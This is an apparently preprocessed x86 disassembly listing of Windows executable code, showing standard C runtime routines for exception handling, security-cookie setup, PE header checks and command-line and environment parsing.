pop edi
pop esi
pop ebx
pop ebp
retn
sub_416fc0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_411c10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_417080
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_416f70
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417080
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_417196
push 0x24
push r--data
call sub_411bb0
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_416886
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_41734b
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_41088c
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_411bf5
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_416df0
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x30 ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x34 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x2c ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417311
cmp esi 0x8
jne r-xdata
mov ecx edx
imul ecx ecx 0xc
mov eax [ edi + 0x5c ]
and [ ecx + eax + 0x8 ] 0x0
inc edx
mov [ ebp - 0x2c ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_41734b
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul edx edx 0xc
add edx [ ebp + 0xc ]
cmp ecx edx
jae r-xdata
mov eax edx
imul eax eax 0xc
add eax [ ebp + 0xc ]
add ecx 0xc
cmp ecx eax
jb r-xdata
xor eax eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
mov eax ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_417387
push ebp
mov ebp esp
xor edx edx
mov eax edx
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] dx
je r-xdata
sub_4173a6
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418bc6
add esp 0x18
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_417387
pop ecx
pop ecx
sub_41740c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_417108
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_41745b
push ebp
mov ebp esp
push esi
call sub_416886
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
add edi 0xc
and [ edi + eax - 0x4 ] 0x0
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_4175b6
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov ebx rw-data
push ebx
xor eax eax
xor edi edi
push edi
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] ebx
test esi esi
je r-xdata
mov esi ebx
cmp [ esi ] di
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x8 ]
cmp eax 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push esi
call sub_417662
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea ecx [ eax + ebx * 2 ]
add ecx ecx
add eax eax
cmp ecx eax
jb r-xdata
push ecx
call sub_411b1b
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_417662
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] eax
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_417662
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp + 0x8 ] 0x20
mov [ ebp - 0x4 ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ ebx ]
test edx edx
je r-xdata
xor eax eax
test edi edi
sete al
push 0x22
add ecx 0x2
mov edi eax
pop eax
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test edi edi
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp [ ecx ] ax
jne r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
pop edi
inc [ eax ]
pop esi
pop ebx
leave
retn
mov [ esi ] ebx
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x18 ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x8 ]
inc [ eax ]
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
inc ebx
push 0x22
pop eax
cmp [ ecx ] ax
push 0x5c
pop eax
jne r-xdata
test ebx ebx
jne r-xdata
test bl 0x1
jne r-xdata
dec ebx
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
shr ebx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
test edx edx
je r-xdata
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
xor eax eax
test esi esi
sete al
mov esi eax
push 0x22
pop edi
cmp [ ecx + 0x2 ] di
mov edi [ ebp + 0x18 ]
jne r-xdata
inc [ edi ]
xor ebx ebx
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
add ecx 0x2
xor ebx ebx
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
je r-xdata
push 0x5c
pop eax
push 0x5c
mov [ ebp - 0x8 ] 0x1
pop eax
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_4177ef
push ebx
push esi
mov esi [ rw-data ]
xor ebx ebx
push edi
mov edi ebx
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x3d
pop ecx
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax cx
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_411ad1
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_418953
lea esi [ esi + eax * 2 ]
pop ecx
add esi 0x2
inc edi
mov esi [ rw-data ]
cmp [ esi ] bx
je r-xdata
push esi
call sub_40f402
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
push esi
call sub_418953
pop ecx
push 0x3d
lea ebx [ eax + 0x1 ]
pop eax
cmp [ esi ] ax
je r-xdata
lea esi [ esi + ebx * 2 ]
xor ebx ebx
cmp [ esi ] bx
jne r-xdata
push 0x2
push ebx
call sub_411ad1
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_40f402
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_40f538
add esp 0xc
test eax eax
jne r-xdata
pop ecx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_412234
int3
add edi 0x4
sub_4178de
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_41791e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
xor ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
leave
retn
sub_4179b8
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
leave
retn
push ebx
xor ebx ebx
push esi
mov esi edi
cmp [ edi ] bx
je r-xdata
sub esi edi
add esi 0x2
push esi
call sub_411b1b
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] bx
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
pop esi
mov eax ebx
pop ebx
push esi
push edi
push eax
call sub_410c10
mov ebx [ ebp - 0x4 ]
add esp 0xc
add esi 0x2
cmp [ esi ] bx
jne r-xdata
sub_417a13
mov ecx [ rw-data ]
xor edx edx
test ecx ecx
jne r-xdata
push esi
push 0x20
pop esi
mov ecx r--data
cmp eax 0x22
jne r-xdata
test ax ax
je r-xdata
add ecx 0x2
jmp r-xdata
xor eax eax
test edx edx
sete al
mov edx eax
mov eax ecx
pop esi
retn
test edx edx
je r-xdata
movzx eax [ ecx ]
cmp ax si
ja r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
cmp ax si
ja r-xdata
add ecx 0x2
sub_417a60
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_41ab3c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_41ab3c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_417aac
push 0x8
push r--data
call sub_411bb0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_411bf5
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_41157c
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
sub_417b5d
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41029e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
sub_417b82
push 0x30
push r--data
call sub_411bb0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov edi [ ebp + 0xc ]
mov eax [ edi - 0x4 ]
mov [ ebp - 0x28 ] eax
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_41175a
pop ecx
pop ecx
mov [ ebp - 0x2c ] eax
call sub_41686e
mov eax [ eax + 0x88 ]
mov [ ebp - 0x30 ] eax
call sub_41686e
mov eax [ eax + 0x8c ]
mov [ ebp - 0x34 ] eax
call sub_41686e
mov [ eax + 0x88 ] esi
call sub_41686e
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
mov [ ebp - 0x4 ] ebx
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_41151e
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_417cd1
mov eax edi
call sub_411bf5
retn
sub_417c21
mov esp [ ebp - 0x18 ]
call sub_41686e
xor ebx ebx
mov [ eax + 0x3ac ] ebx
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push edx
push ebx
push edi
call sub_418619
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_417cd1
mov eax edi
call sub_411bf5
retn
mov esi eax
imul esi esi 0x14
mov edi [ edx + 0x10 ]
cmp ecx [ esi + edi + 0x4 ]
mov edi [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] ecx
mov eax [ edx + 0x10 ]
mov [ ebp + 0x18 ] eax
mov eax ebx
mov [ ebp - 0x24 ] eax
cmp [ edx + 0xc ] eax
jbe r-xdata
inc eax
mov [ ebp - 0x24 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov edx [ ebp + 0x18 ]
cmp ecx [ esi + edx + 0x8 ]
mov edx [ ebp + 0x14 ]
jg r-xdata
imul eax eax 0x14
mov ecx [ edx + 0x10 ]
mov eax [ eax + ecx + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov ecx [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
sub_417cd1
mov eax [ ebp - 0x28 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x2c ]
call sub_411784
pop ecx
call sub_41686e
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x88 ] ecx
call sub_41686e
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov edi [ ebp - 0x1c ]
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
retn
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_4117d4
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_417aac
pop ecx
pop ecx
jmp r-xdata
sub_417d90
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_4183b8
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_4116d7
call sub_411707
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_418619
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_417b82
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_417e0b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_41686e
xor ecx ecx
inc ecx
mov [ eax + 0x3ac ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_417e58
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
xor ebx ebx
cmp [ edi + 0x4 ] 0x80
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x1 ] bl
jg r-xdata
mov eax [ eax + 0x8 ]
movsx eax [ eax + 0x8 ]
jmp r-xdata
call sub_4170d0
cmp eax [ edi + 0x4 ]
jl r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_41686e
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ ebp + 0x1c ] bl
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4170d0
call sub_417108
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_4181f3
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_41686e
cmp [ eax + 0x88 ] ebx
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_41686e
mov esi [ eax + 0x88 ]
call sub_41686e
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x24 ] 0x1
call sub_41d2dc
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_4170d0
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_411658
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x28 ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_41686e
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_417aac
pop ecx
pop ecx
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
call sub_41686e
mov eax [ eax + 0x94 ]
mov [ ebp - 0x14 ] eax
call sub_41686e
push [ ebp - 0x14 ]
mov [ eax + 0x94 ] ebx
push esi
call sub_41830d
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc ecx
add edx 0x14
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
cmp ecx [ ebp - 0x28 ]
jb r-xdata
cmp eax [ edx - 0xc ]
jg r-xdata
mov edi [ ebp - 0x14 ]
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
lea ebx [ edx - 0x10 ]
mov [ ebp - 0x2c ] ebx
mov ebx [ ebp + 0xc ]
cmp [ edx - 0x10 ] eax
jg r-xdata
xor ebx ebx
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ edx - 0x4 ]
mov [ ebp - 0x20 ] edi
test edi edi
mov edi [ ebp + 0x18 ]
jle r-xdata
mov eax ebx
mov [ ebp + 0x18 ] ebx
call sub_4170d0
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x1c ]
push esi
call sub_41830d
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
push esi
call sub_417aac
pop ecx
pop ecx
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp + 0x18 ] r--data
call sub_41023b
push r--data
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x3c ] r--data
call sub_4112eb
mov eax [ ebp + 0x18 ]
inc ebx
add eax 0x10
mov [ ebp + 0x18 ] eax
cmp ebx [ edi ]
jl r-xdata
call sub_41686e
call sub_41686e
call sub_41686e
mov [ eax + 0x88 ] esi
call sub_41686e
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
test eax eax
jg r-xdata
mov ecx [ edi + 0x4 ]
push rw-data
mov ecx [ eax + ecx + 0x4 ]
call sub_40f212
test al al
jne r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x1c ]
mov eax [ edx ]
push eax
push ecx
mov [ ebp - 0x30 ] eax
call sub_4187d1
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
dec eax
add ecx 0x10
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] ecx
test eax eax
jg r-xdata
call sub_411707
push 0xffffffff
